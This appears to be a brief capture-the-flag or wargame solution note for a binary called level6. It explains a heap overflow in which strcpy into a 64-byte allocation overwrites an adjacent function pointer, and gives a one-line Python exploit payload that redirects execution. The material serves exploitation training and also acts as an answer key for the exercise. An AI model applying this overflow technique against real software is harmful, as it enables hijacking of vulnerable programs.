There is an malloc of 64 followed by an malloc of 4

there is no limit of copy since we use strcpy

if we overwrite the malloc of 64 we can overwrite the next of 4 -->


MALLOC(64)

METADATA(8) - 64 bytes

malloc(4)

METADATA(8) - 64 bytes - METADATA(8) - 4 bytes

we can then overwrite the ptr func with the func we want

./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
